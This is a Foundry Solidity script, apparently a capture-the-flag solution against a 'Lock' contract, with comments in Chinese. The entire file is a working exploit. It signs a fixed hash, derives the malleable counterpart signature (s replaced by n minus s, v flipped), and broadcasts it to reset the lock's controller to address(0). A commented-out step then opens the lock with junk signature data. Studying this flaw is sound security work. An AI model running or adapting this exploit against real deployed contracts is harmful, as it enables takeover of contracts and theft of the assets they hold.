// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface ILock {
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
    function open(uint8 v, bytes32 r, bytes32 s) external;
    function controller() external view returns (address);
}

contract SolveMalleability is Script {
    // secp256k1 的曲線階數 (n)
    uint256 constant SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function run() external {
        uint256 pk = vm.envUint("PRIVATE_KEY");
        address lockAddress = vm.envAddress("LOCK");
        ILock lock = ILock(lockAddress);

        // 1. 這是你之前的 msgHash
        bytes32 hashToSign = 0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae;

        // 2. 先生成原始簽名 (v, r, s)
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hashToSign);
        
        console.log("Original v:", v);
        console.logBytes32(r);
        console.logBytes32(s);

        // 3. 計算延展性簽名 (New v, New s)
        // new_s = n - s
        // new_v = (v == 27) ? 28 : 27
        uint256 new_s_uint = SECP256K1_N - uint256(s);
        bytes32 new_s = bytes32(new_s_uint);
        uint8 new_v = (v == 27) ? 28 : 27;

        console.log("Malleable Signature generated:");
        console.log("new_v:", new_v);
        console.logBytes32(r);
        console.logBytes32(new_s);

        // 4. 發送交易：使用「新的」簽名將 controller 設為 0
        vm.startBroadcast(pk);
        
        console.log("Setting controller to address(0)...");
        lock.changeController(new_v, r, new_s, address(0));
        
        // 5. 既然 controller 已經是 0，隨便拿個垃圾資料 open()
        // console.log("Calling open() with dummy data...");
        // lock.open(27, bytes32(uint256(1)), bytes32(uint256(1)));
        
        vm.stopBroadcast();

        console.log("SUCCESS: Controller is now 0 and Lock is open!");
    }
}
